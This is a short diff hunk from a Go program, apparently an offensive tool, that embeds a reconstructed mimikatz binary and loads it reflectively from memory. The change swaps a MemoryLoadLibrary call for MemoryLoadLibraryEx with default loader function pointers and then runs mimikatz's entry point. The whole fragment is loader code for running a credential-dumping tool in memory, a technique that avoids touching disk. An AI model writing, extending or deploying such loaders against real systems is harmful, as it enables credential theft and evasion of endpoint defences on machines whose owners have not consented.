@@ -36,10 +36,14 @@ func main() {
 	}
 
 	// load the mimikatz reconstructed binary from memory
-	handle := C.MemoryLoadLibrary(unsafe.Pointer(&mimikatzEXE[0]), &cArgs[0])
-	if handle == nil {
-		panic("MemoryLoadLibrary failed")
-	}
+	handle := C.MemoryLoadLibraryEx(
+		unsafe.Pointer(&mimikatzEXE[0]),           // void *data
+		(C.size_t)(len(mimikatzEXE)),              // size_t
+		(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
+		(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
+		(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
+		unsafe.Pointer(&cArgs[0]),                 // void *userdata
+	)
 
 	// run mimikatz
 	C.MemoryCallEntryPoint(handle)
